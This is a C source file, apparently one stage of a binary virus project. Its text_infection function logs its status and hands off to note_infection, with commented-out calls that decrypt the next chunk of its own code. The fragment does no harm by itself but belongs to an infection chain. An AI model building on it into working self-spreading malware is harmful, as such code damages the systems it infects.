#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void text_infection(struct s_host *host, struct s_keychain *keychain, enum e_context context)
{
//	decrypt_right(keychain, (char *)criteria, (void *)text_infection - (void *)criteria);

	printf("%s\t\t%s\n",__PRETTY_FUNCTION__, context == SUCCESS ? "success" : "error");
	if (context == FAILURE)
		goto label;

label:
//	update_keychain_right(keychain, (char *)text_infection, (void *)note_infection - (void *)text_infection);
//	decrypt_right(keychain, (char *)note_infection, (void *)header_infection - (void *)note_infection);

	note_infection(host, keychain, context);
}
